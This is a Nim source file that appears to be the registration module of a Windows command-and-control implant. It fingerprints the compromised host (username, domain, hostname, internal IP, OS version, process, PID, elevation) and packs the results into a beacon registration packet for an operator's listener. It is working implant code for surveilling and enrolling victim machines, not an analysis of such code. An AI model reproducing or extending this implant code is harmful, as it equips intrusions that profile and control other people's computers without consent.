import winim, os, net, strformat, strutils, registry

import ../../../common/[types, serialize, utils]

# Hostname/Computername
proc getHostname*(): string = 
    var
        buffer = newWString(CNLEN + 1) 
        dwSize = DWORD buffer.len

    GetComputerNameW(&buffer, &dwSize)
    return $buffer[0 ..< int(dwSize)]

# Domain Name
proc getDomain*(): string = 
    const ComputerNameDnsDomain = 2 # COMPUTER_NAME_FORMAT (https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format)
    var
        buffer = newWString(UNLEN + 1) 
        dwSize = DWORD buffer.len

    GetComputerNameExW(ComputerNameDnsDomain, &buffer, &dwSize)
    return $buffer[ 0 ..< int(dwSize)]

# Username
proc getUsername*(): string = 
    const NameSamCompatible = 2 # EXTENDED_NAME_FORMAT (https://learn.microsoft.com/de-de/windows/win32/api/secext/ne-secext-extended_name_format) 
    
    var
        buffer = newWString(UNLEN + 1) 
        dwSize = DWORD buffer.len

    if getDomain() != "": 
        # If domain-joined, return username in format DOMAIN\USERNAME
        GetUserNameExW(NameSamCompatible, &buffer, &dwSize)
    else: 
        # If not domain-joined, only return USERNAME
        discard GetUsernameW(&buffer, &dwSize)

    return $buffer[0 ..< int(dwSize)]

# Current process name
proc getProcessExe*(): string = 
    let 
        hProcess: HANDLE = GetCurrentProcess() 
        buffer = newWString(MAX_PATH + 1)

    try:
        if hProcess != 0: 
            if GetModuleFileNameExW(hProcess, 0, buffer, MAX_PATH): 
                # .extractFilename() from the 'os' module gets the name of the executable from the full process path
                # We replace trailing NULL bytes to prevent them from being sent as JSON data
                return string($buffer).extractFilename().replace("\u0000", "")
    finally: 
        CloseHandle(hProcess)

# Current process ID
proc getProcessId*(): int = 
    return int(GetCurrentProcessId()) 

# Current process elevation/integrity level
proc isElevated*(): bool = 
    # isAdmin() function from the 'os' module returns whether the process is executed with administrative privileges
    return isAdmin() 

# IPv4 Address (Internal)
proc getIPv4Address*(): string = 
    # getPrimaryIPAddr from the 'net' module finds the local IP address, usually assigned to eth0 on LAN or wlan0 on WiFi, used to reach an external address. No traffic is sent
    return $getPrimaryIpAddr()

# Windows Version fingerprinting
type 
    ProductType* = enum
        UNKNOWN = 0
        WORKSTATION = 1
        DC = 2
        SERVER = 3

# API Structs
type OSVersionInfoExW* {.importc: "OSVERSIONINFOEXW", header: "<windows.h>".} = object
    dwOSVersionInfoSize*: ULONG
    dwMajorVersion*: ULONG
    dwMinorVersion*: ULONG
    dwBuildNumber*: ULONG
    dwPlatformId*: ULONG
    szCSDVersion*: array[128, WCHAR]
    wServicePackMajor*: USHORT
    wServicePackMinor*: USHORT
    wSuiteMask*: USHORT
    wProductType*: UCHAR
    wReserved*: UCHAR

proc getWindowsVersion*(info: OSVersionInfoExW, productType: ProductType): string =
    let
        major = info.dwMajorVersion
        minor = info.dwMinorVersion
        build = info.dwBuildNumber
        spMajor = info.wServicePackMajor
    
    if major == 10 and minor == 0:
        if productType == WORKSTATION:
            if build >= 22000:
                return "Windows 11"
            else:
                return "Windows 10"

        else:
            case build:
                of 20348:
                    return "Windows Server 2022"
                of 17763:
                    return "Windows Server 2019"
                of 14393:
                    return "Windows Server 2016"
                else:
                    return fmt"Windows Server 10.x (Build: {build})"

    elif major == 6:
        case minor:
        of 3:
            if productType == WORKSTATION:
                return "Windows 8.1"
            else:
                return "Windows Server 2012 R2"
        of 2:
            if productType == WORKSTATION:
                return "Windows 8"
            else:
                return "Windows Server 2012"
        of 1:
            if productType == WORKSTATION:
                return "Windows 7"
            else:
                return "Windows Server 2008 R2"
        of 0:
            if productType == WORKSTATION:
                return "Windows Vista"
            else:
                return "Windows Server 2008"
        else: 
            discard

    elif major == 5:
        if minor == 2:
            if productType == WORKSTATION:
                return "Windows XP x64 Edition"
            else:
                return "Windows Server 2003"
        elif minor == 1:
            return "Windows XP"
    else: 
        discard 

    return "Unknown Windows Version"

proc getProductType(): ProductType =
    # The product key is retrieved from the registry
    # HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
    #   ProductType    REG_SZ    WinNT
    # Possible values are: 
    #   LanmanNT -> Server/Domain Controller
    #   ServerNT -> Server
    #   WinNT    -> Workstation

    # Using the 'registry' module, we can get the exact registry value
    case getUnicodeValue("""SYSTEM\CurrentControlSet\Control\ProductOptions""", "ProductType", HKEY_LOCAL_MACHINE)
    of "WinNT":
        return WORKSTATION
    of "ServerNT":
        return SERVER
    of "LanmanNT": 
        return DC

proc getOSVersion*(): string = 
    
    proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
        {.cdecl, importc: "RtlGetVersion", dynlib: "ntdll.dll".}

    when defined(windows):
        var osInfo: OSVersionInfoExW
        discard rtlGetVersion(osInfo)
        # echo $int(osInfo.dwMajorVersion)
        # echo $int(osInfo.dwMinorVersion)
        # echo $int(osInfo.dwBuildNumber)

        # RtlGetVersion does not actually set the Product Type, which is required to differentiate 
        # between workstation and server systems. The value is set to 0, which would lead to all systems being "unknown"
        # Normally, a value of 1 indicates a workstation os, while other values represent servers
        # echo $int(osInfo.wProductType).toHex

        # We instead retrieve the     
        return getWindowsVersion(osInfo, getProductType())
    else:
        return "Unknown"

proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData = 
    
    return AgentRegistrationData(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_REGISTER),
            flags: cast[uint16](FLAG_PLAINTEXT),
            seqNr: 1'u32, # TODO: Implement sequence tracking
            size: 0'u32,
            hmac: default(array[16, byte])
        ), 
        metadata: AgentMetadata(
            agentId: uuidToUint32(config.agentId),
            listenerId: uuidToUint32(config.listenerId),
            username: getUsername().toBytes(),
            hostname: getHostname().toBytes(),
            domain: getDomain().toBytes(),
            ip: getIPv4Address().toBytes(),
            os: getOSVersion().toBytes(),
            process: getProcessExe().toBytes(),
            pid: cast[uint32](getProcessId()),
            isElevated: cast[uint8](isElevated()),
            sleep: cast[uint32](config.sleep)
        )
    )

proc serializeRegistrationData*(data: AgentRegistrationData): seq[byte] = 

    var packer = initPacker()

    # Serialize registration data
    packer 
        .add(data.metadata.agentId)
        .add(data.metadata.listenerId)
        .addVarLengthMetadata(data.metadata.username)
        .addVarLengthMetadata(data.metadata.hostname)
        .addVarLengthMetadata(data.metadata.domain)
        .addVarLengthMetadata(data.metadata.ip)
        .addVarLengthMetadata(data.metadata.os)
        .addVarLengthMetadata(data.metadata.process)
        .add(data.metadata.pid)
        .add(data.metadata.isElevated)
        .add(data.metadata.sleep)

    let metadata = packer.pack()
    packer.reset()

    # TODO: Encrypt metadata

    # Serialize header
    packer
        .add(data.header.magic)
        .add(data.header.version)
        .add(data.header.packetType)
        .add(data.header.flags)
        .add(data.header.seqNr) 
        .add(cast[uint32](metadata.len))
        .addData(data.header.hmac)

    let header = packer.pack()

    return header & metadata
